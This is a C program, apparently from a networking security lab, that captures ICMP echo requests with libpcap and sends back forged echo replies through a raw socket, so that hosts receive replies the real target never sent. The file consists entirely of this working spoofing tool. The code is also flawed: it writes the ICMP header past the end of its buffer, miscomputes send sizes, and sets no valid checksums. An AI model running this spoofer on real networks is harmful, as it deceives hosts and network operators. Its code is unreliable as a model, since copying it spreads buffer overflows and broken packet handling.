#include <pcap.h>

#include <stdio.h>

#include <string.h>

#include <stdlib.h>

#include <ctype.h>

#include <errno.h>

#include <sys/types.h>

#include <sys/socket.h>

#include <netinet/in.h>

#include <arpa/inet.h>

#include <netdb.h>

#include <netinet/in_systm.h>

#include <netinet/ip.h>

#include <netinet/ip_icmp.h>

/* default snap length (maximum bytes per packet to capture) */

#define SNAP_LEN 1518

/* ethernet headers are always exactly 14 bytes [1] */

#define SIZE_ETHERNET 14

/* Ethernet addresses are 6 bytes */

#define ETHER_ADDR_LEN     6

/* Ethernet header */

struct ethernet_hdr {

u_char  ether_dhost[ETHER_ADDR_LEN];    /* destination host address */

u_char  ether_shost[ETHER_ADDR_LEN];    /* source host address */

u_short ether_type;                     /* IP? ARP? RARP? etc */

};

/* IP header */

struct ip_hdr {

u_char  ip_vhl;                   /* version << 4 | header length >> 2 */

u_char  ip_tos;                 /* type of service */

u_short ip_len;                 /* total length */

u_short ip_id;                  /* identification */

u_short ip_off;                 /* fragment offset field */

u_char  ip_ttl;                 /* time to live */

u_char  ip_p;                   /* protocol */

u_short ip_sum;                 /* checksum */

struct  in_addr ip_src;           /* source address */

struct  in_addr ip_dst;    /* dest address */

};

#define IP_HL(ip)               (((ip)->ip_vhl) & 0x0f)

#define IP_V(ip)                (((ip)->ip_vhl) >> 4)

// Description:  icmp header, according to the structure of icmp header, I define a struct icmp_hdr

// the icmp structure is shown in Figure 8.1 below.

/* ICMP header */

struct icmp_hdr {

unsigned char type;       //icmp service type, 8 echo request, 0 echo reply

unsigned char code;       //icmp header code

unsigned short checksum;  //icmp header chksum

unsigned short id;        //icmp packet identification

unsigned short seq;       //icmp packet sequent

};

// Description:  myping function, I used this function when capture a ICMP request packet,

// this function can create a ICMP reply socket and send it back to the source of the ICMP request packet

// argument argIP is received ip header

// argument packet is received packet

void myping(struct ip_hdr *sniff_ip, const u_char *packet, int size_ip, int count, int id, int seq)

{

// Don’t miss the Ethernet header.

char buf[size_ip+SIZE_ETHERNET];

const struct ethernet_hdr *ethernet;

ethernet = (struct ethernet_hdr*)(packet);

int s, i;

struct ip_hdr *spoof_ip = (struct ip_hdr*)(buf+SIZE_ETHERNET);

struct icmp_hdr *spoof_icmp = (struct icmp_hdr*)(buf+size_ip+SIZE_ETHERNET);

struct hostent *hp, *hp2;

struct sockaddr_in dst;

int on;

int offset = 0;

on = 1;

bzero(buf, sizeof(buf));

/* Create RAW socket */

if((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)

{

perror("socket() error");

/* If something wrong, just exit */

exit(1);

}

/* socket options, tell the kernel we provide the IP structure */

if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0)

{

perror("setsockopt() for IP_HDRINCL error");

exit(1);

}

printf("Sending to %s from spoofed", inet_ntoa(sniff_ip->ip_dst));

printf(" %s\n", inet_ntoa(sniff_ip->ip_dst));

/* Ip structure, check the ip.h */

spoof_ip->ip_vhl = sniff_ip->ip_vhl;

spoof_ip->ip_tos = sniff_ip->ip_tos;

spoof_ip->ip_len = sniff_ip->ip_len;

spoof_ip->ip_id = id;

spoof_ip->ip_off = sniff_ip->ip_off;

spoof_ip->ip_ttl = sniff_ip->ip_ttl;

spoof_ip->ip_p = sniff_ip->ip_p;

spoof_ip->ip_sum =  sniff_ip->ip_sum;

spoof_ip->ip_src = sniff_ip->ip_dst;

spoof_ip->ip_dst = sniff_ip->ip_src;

dst.sin_addr = spoof_ip->ip_dst;

dst.sin_family = AF_INET;

spoof_icmp->type = 0;

spoof_icmp->code = 0;

spoof_icmp->checksum = 0;

spoof_icmp->id = id;

spoof_icmp->seq = seq;

if(sendto(s, buf, sizeof(buf), 0, (struct sockaddr *)&dst, sizeof(dst)) < 0)

{

fprintf(stderr, "offset %d: ", offset);

perror("sendto() error");

}

else

printf("sendto() is OK.\n");

/* close socket */

close(s);

}

// We can use this function to modify the original packet.

void myping2(struct ip_hdr *sniff_ip, char *packet, struct icmp_hdr *spoof_icmp, int size_ethernet, int size_ip)

{

int s;

int on = 1;

struct sockaddr_in dst;

/* Create RAW socket */

if((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)

{

perror("socket() error");

/* If something wrong, just exit */

exit(1);

}

/* socket options, tell the kernel we provide the IP structure */

if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0)

{

perror("setsockopt() for IP_HDRINCL error");

exit(1);

}

printf("Sending to %s from spoofed", inet_ntoa(sniff_ip->ip_dst));

printf(" %s\n", inet_ntoa(sniff_ip->ip_dst));

/* Ip structure, check the ip.h */

struct  in_addr tmp = sniff_ip->ip_src;

sniff_ip->ip_src = sniff_ip->ip_dst;

sniff_ip->ip_dst = tmp;

dst.sin_addr = sniff_ip->ip_dst;

dst.sin_family = AF_INET;

spoof_icmp->type = 0;

if(sendto(s, packet, sizeof(packet), 0, (struct sockaddr *)&dst, sizeof(dst)) < 0)

{

fprintf(stderr, "offset %d: ", 0);

perror("sendto() error");

}

else

printf("sendto() is OK.\n");

/* close socket */

close(s);

}

// Description: I modified this function. Since we only care about ICMP packet, I modified this function so // that it only deals with ICMP request packet

void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)

{

static int count = 1;                   /* packet counter */

/* declare pointers to packet headers */

const struct ethernet_hdr *ethernet;  /* The ethernet header [1] */

const struct ip_hdr *sniff_ip;              /* The IP header */

int size_ip;

int size_tcp;

int size_payload;

/* define ethernet header */

ethernet = (struct ethernet_hdr*)(packet);

/* define/compute ip header offset */

sniff_ip = (struct ip_hdr*)(packet + SIZE_ETHERNET);

size_ip = IP_HL(sniff_ip)*4;

if (size_ip < 20) {

printf("   * Invalid IP header length: %u bytes\n", size_ip);

return;

}

/* determine protocol */

switch(sniff_ip->ip_p) {

case IPPROTO_TCP:

printf("   Protocol: TCP\n");

break;

case IPPROTO_UDP:

printf("   Protocol: UDP\n");

return;

case IPPROTO_ICMP:

{

const struct icmp_hdr *sniff_icmp = (struct icmp_hdr*)(packet+SIZE_ETHERNET+size_ip);

if(sniff_icmp->type==8)

{

// Description:  if received packet protocol is ICMP, try to find if it is ICMP request (type = 8)

// if it is ICMP request, call myping function to send ICMP reply with spoofed IP address

printf("\nPacket number %d:\n", count);

count++;

printf("       From: %s\n", inet_ntoa(sniff_ip->ip_src));

printf("         To: %s\n", inet_ntoa(sniff_ip->ip_dst));

printf("   Protocol: ICMP\n");

myping(sniff_ip, packet, size_ip, count, sniff_icmp->id, sniff_icmp->seq);

}

return;

}

case IPPROTO_IP:

printf("   Protocol: IP\n");

return;

default:

printf("   Protocol: unknown\n");

return;

}

return;

}

int main(int argc, char **argv)

{

char *dev = NULL;                 /* capture device name */

char errbuf[PCAP_ERRBUF_SIZE];           /* error buffer */

pcap_t *handle;                          /* packet capture handle */

char filter_exp[] = "icmp";       /* filter expression [3] */

struct bpf_program fp;                   /* compiled filter program (expression) */

bpf_u_int32 mask;                 /* subnet mask */

bpf_u_int32 net;                  /* ip */

int num_packets = 0;              /* number of packets to capture */

//print_app_banner();

/* check for capture device name on command-line */

if (argc == 2) {

dev = argv[1];

}

else if (argc > 2) {

fprintf(stderr, "error: unrecognized command-line options\n\n");

//print_app_usage();

exit(EXIT_FAILURE);

}

else {

/* find a capture device if not specified on command-line */

dev = pcap_lookupdev(errbuf);

if (dev == NULL) {

fprintf(stderr, "Couldn’t find default device: %s\n",

errbuf);

exit(EXIT_FAILURE);

}

}

/* get network number and mask associated with capture device */

if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {

fprintf(stderr, "Couldn’t get netmask for device %s: %s\n",

dev, errbuf);

net = 0;

mask = 0;

}

/* print capture info */

printf("Device: %s\n", dev);

printf("Number of packets: %d\n", num_packets);

printf("Filter expression: %s\n", filter_exp);

/* open capture device */

handle = pcap_open_live(dev, SNAP_LEN, 1, 1000, errbuf);

if (handle == NULL) {

fprintf(stderr, "Couldn’t open device %s: %s\n", dev, errbuf);

exit(EXIT_FAILURE);

}

/* make sure we’re capturing on an Ethernet device [2] */

if (pcap_datalink(handle) != DLT_EN10MB) {

fprintf(stderr, "%s is not an Ethernet\n", dev);

exit(EXIT_FAILURE);

}

/* compile the filter expression */

if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {

fprintf(stderr, "Couldn’t parse filter %s: %s\n",

filter_exp, pcap_geterr(handle));

exit(EXIT_FAILURE);

}

/* apply the compiled filter */

if (pcap_setfilter(handle, &fp) == -1) {

fprintf(stderr, "Couldn’t install filter %s: %s\n",

filter_exp, pcap_geterr(handle));

exit(EXIT_FAILURE);

}

/* now we can set our callback function */

pcap_loop(handle, num_packets, got_packet, NULL);

/* cleanup */

pcap_freecode(&fp);

pcap_close(handle);

printf("\nCapture complete.\n");

return 0;

}